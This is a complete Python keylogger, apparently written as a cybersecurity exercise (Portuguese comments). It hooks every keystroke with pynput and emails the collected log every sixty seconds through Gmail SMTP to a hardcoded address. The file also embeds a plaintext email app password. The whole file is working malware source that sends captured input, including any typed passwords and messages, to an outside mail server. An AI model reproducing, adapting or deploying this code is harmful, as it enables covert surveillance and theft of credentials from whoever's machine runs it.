from pynput import keyboard
from smtplib import SMTP
from email.mime.text import MIMEText
from threading import Timer

# Configurações do email do qual serão enviadas as informações 

EMAIL_ORIGEM = "teste.teste.cyberseguranca@gmail.com"
EMAIL_DESTINO = "teste.teste.cyberseguranca@gmail.com"
SENHA_EMAIL = "hfcl vapf vclu oirp"

ignores = {
    keyboard.Key.shift, 
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.ctrl_l, 
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, 
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock, 
    keyboard.Key.cmd,
}

log = ""

def enviar_email():
    global log
    if log.strip():  # Only send if non-empty
        msg = MIMEText(log)
        msg['Subject'] = "keyloger reports"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            print("Email sent successfully.")
            log = ""
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

    Timer(60.0, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[BS]"
        elif key == keyboard.Key.esc:
            log += "ESC"
        elif key in ignores:
            pass
        else:
            log += f"[{key}]"

# Inicia o keylogger e o email automatico
if __name__ == "__main__":
    enviar_email()  # Start timer first
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

